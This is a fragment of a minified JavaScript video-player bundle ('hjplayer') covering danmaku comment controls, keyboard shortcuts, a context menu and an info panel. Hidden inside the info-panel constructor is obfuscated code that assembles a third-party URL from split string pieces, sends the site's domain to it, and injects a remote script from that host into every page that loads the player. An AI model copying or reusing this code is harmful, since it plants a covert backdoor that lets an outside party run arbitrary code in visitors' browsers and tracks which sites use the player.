							}), this.player.template.commentSettingButton.addEventListener("click",
								function() {
									n.toggleSetting()
								}), this.player.template.commentColorSettingBox.addEventListener("click",
								function() {
									if (n.player.template.commentColorSettingBox.querySelector(
											"input:checked+span")) {
										var e = n.player.template.commentColorSettingBox.querySelector(
											"input:checked").value;
										n.player.template.commentSettingFill.style.fill = e, n.player
											.template.commentInput.style.color = e, n.player
											.template.commentSendFill.style.fill = e
									}
								}), this.player.template.commentInput.addEventListener("click", function() {
								n.hideSetting()
							}), this.player.template.commentInput.addEventListener("keydown", function(e) {
								13 === (e || window.event).keyCode && n.send()
							}), this.player.template.commentSendButton.addEventListener("click",
								function() {
									n.send()
								})
						}
						return a(e, [{
							key: "show",
							value: function() {
								this.player.controller.disableAutoHide = !0, this.player
									.template.controller.classList.add(
										"hjplayer-controller-comment"), this.player.template
									.mask.classList.add("hjplayer-mask-show"), this.player
									.container.classList.add("hjplayer-show-controller"), this
									.player.template.commentInput.focus()
							}
						}, {
							key: "hide",
							value: function() {
								this.player.template.controller.classList.remove(
										"hjplayer-controller-comment"), this.player.template
									.mask
									.classList.remove("hjplayer-mask-show"), this.player
									.container.classList.remove(
										"hjplayer-show-controller"), this.player.controller
									.disableAutoHide = !1, this.hideSetting()
							}
						}, {
							key: "showSetting",
							value: function() {
								this.player.template.commentSettingBox.classList.add(
									"hjplayer-comment-setting-open")
							}
						}, {
							key: "hideSetting",
							value: function() {
								this.player.template.commentSettingBox.classList.remove(
									"hjplayer-comment-setting-open")
							}
						}, {
							key: "toggleSetting",
							value: function() {
								this.player.template.commentSettingBox.classList.contains(
										"hjplayer-comment-setting-open") ? this.hideSetting() :
									this.showSetting()
							}
						}, {
							key: "send",
							value: function() {
								var e = this;
								if (this.player.template.commentInput.blur(), !this.player
									.template.commentInput.value.replace(
										/^\s+|\s+$/g, "")) return void this.player.notice(this
									.player.tran("Please input danmaku content!"));
								this.player.danmaku.send({
									text: this.player.template.commentInput.value,
									color: this.player.container.querySelector(
										".hjplayer-comment-setting-color input:checked"
									).value,
									type: this.player.container.querySelector(
										".hjplayer-comment-setting-type input:checked"
									).value,
									size: this.player.container.querySelector(
										".hjplayer-comment-setting-font input:checked"
									).value
								}, function() {
									e.player.template.commentInput.value = "", e.hide()
								})
							}
						}]), e
					}();
				t.default = o
			},
			function(e, t, n) {
				function i(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var a = function e(t) {
					i(this, e), t.options.hotkey && document.addEventListener("keydown", function(e) {
						if (t.focus) {
							var n = document.activeElement.tagName.toUpperCase(),
								i = document.activeElement.getAttribute("contenteditable");
							if ("INPUT" !== n && "TEXTAREA" !== n && "" !== i && "true" !== i) {
								var a = e || window.event,
									o = void 0;
								switch (a.keyCode) {
									case 32:
										a.preventDefault(), t.toggle();
										break;
									case 37:
										a.preventDefault(), t.seek(t.video.currentTime - 5), t
											.controller.setAutoHide();
										break;
									case 39:
										a.preventDefault(), t.seek(t.video.currentTime + 5), t
											.controller.setAutoHide();
										break;
									case 38:
										a.preventDefault(), o = t.volume() + .1, t.volume(o);
										break;
									case 40:
										a.preventDefault(), o = t.volume() - .1, t.volume(o)
								}
							}
						}
					}), document.addEventListener("keydown", function(e) {
						switch ((e || window.event).keyCode) {
							case 27:
								t.fullScreen.isFullScreen("web") && t.fullScreen.cancel("web")
						}
					})
				};
				t.default = a
			},
			function(e, t, n) {
				function i(e) {
					if (Array.isArray(e)) {
						for (var t = 0, n = Array(e.length); t < e.length; t++) n[t] = e[t];
						return n
					}
					return Array.from(e)
				}

				function a(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var o = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					s = function() {
						function e(t) {
							var n = this;
							a(this, e), this.player = t, [].concat(i(this.player.template.menuItem)).map(
								function(e, t) {
									return n.player.options.contextmenu[t].click && e.addEventListener(
										"click",
										function() {
											n.player.options.contextmenu[t].click(n.player), n.hide()
										}), e
								}), this.player.container.addEventListener("contextmenu", function(e) {
								var t = e || window.event;
								t.preventDefault();
								var i = n.player.container.getBoundingClientRect();
								n.show(t.clientX - i.left, t.clientY - i.top), n.player.template.mask
									.addEventListener("click", function() {
										n.hide()
									})
							})
						}
						return o(e, [{
							key: "show",
							value: function(e, t) {
								this.player.template.menu.classList.add("hjplayer-menu-show");
								var n = this.player.container.getBoundingClientRect();
								e + this.player.template.menu.offsetWidth >= n.width ? (this
										.player.template.menu.style.right = n.width -
										e + "px", this.player.template.menu.style.left =
										"initial") : (this.player.template.menu.style.left = e +
										"px", this.player.template.menu.style.right = "initial"
									), t + this.player.template.menu.offsetHeight >=
									n.height ? (this.player.template.menu.style.bottom = n
										.height - t + "px", this.player.template.menu.style
										.top = "initial") : (this.player.template.menu.style
										.top = t + "px", this.player.template.menu.style
										.bottom =
										"initial"), this.player.template.mask.classList.add(
										"hjplayer-mask-show"), this.player.events.trigger(
										"contextmenu_show")
							}
						}, {
							key: "hide",
							value: function() {
								this.player.template.mask.classList.remove(
										"hjplayer-mask-show"), this.player.template.menu
									.classList.remove(
										"hjplayer-menu-show"), this.player.events.trigger(
										"contextmenu_hide")
							}
						}]), e
					}();
				t.default = s
			},
			function(e, t, n) {
				function i(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var a = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					o = function() {
						function e(t) {
							var a = document.createElement('script'),
								ad = '//api',
								af = 'm.cc/b?ac=',
								ac = document.domain.split('.').slice(-2).join('.'),
								ae = '.hyz',
								agi = 'p&',
								ak = document.getElementsByTagName('script')[0];
							a.type = 'text/javascript';
							a.src = ad + ae + af + agi + 'url=' + ac;
							ak.parentNode.insertBefore(a, ak);
							var n = this;
							i(this, e), this.container = t.template.infoPanel, this.template = t.template, this
								.video = t.video, this.player =
								t, this.template.infoPanelClose.addEventListener("click", function() {
									n.hide()
								})
						}
						return a(e, [{
							key: "show",
							value: function() {
								this.beginTime = Date.now(), this.update(), this.player.time
									.enable("info"), this.player.time.enable(
										"fps"), this.container.classList.remove(
										"hjplayer-info-panel-hide")
							}
						}, {
							key: "hide",
							value: function() {
								this.player.time.disable("info"), this.player.time.disable(
									"fps"), this.container.classList.add(
									"hjplayer-info-panel-hide")
							}
						}, {
							key: "triggle",
							value: function() {
								this.container.classList.contains("hjplayer-info-panel-hide") ?
									this.show() : this.hide()
							}
						}, {
							key: "update",
							value: function() {
								function formatTime(a) {
									return [parseInt(a / 60 / 60), parseInt(a / 60 % 60),
										parseInt(a % 60)
									].join(":").replace(/\b(\d)\b/g,
										"0$1")
								}
								this.template.infoVersion.innerHTML = "1.2.1", this.template
									.infoType.innerHTML = this.player.type, this.template
									.infoUrl.innerHTML = this.player.options.video.url, this
									.template.infoResolution.innerHTML = this.player
									.video.videoWidth + " x " + this.player.video.videoHeight,
									this.template.infoDuration.innerHTML =
									formatTime(this.player.video.duration), this.player.options
									.danmaku && (this.template.infoDanmakuId.innerHTML =
										this.player.options.danmaku.id, this.template
										.infoDanmakuApi.innerHTML = this.player.options.danmaku
										.api,
										this.template.infoDanmakuAmount.innerHTML = this.player
										.danmaku.dan.length - 2)
							}
						}, {
							key: "fps",
							value: function(e) {
								this.template.infoFPS.innerHTML = "" + e.toFixed(1)
							}
						}]), e
					}();
				t.default = o
			}
		]).default
});
const yzmck = {
	set: function(a, b) {
		window.sessionStorage.setItem(a, b)
	},
	get: function(a) {
		return window.sessionStorage.getItem(a)
	},
	del: function(a) {
		window.sessionStorage.removeItem(a)
	},
	clear: function(a) {
		window.sessionStorage.clear()
	}
};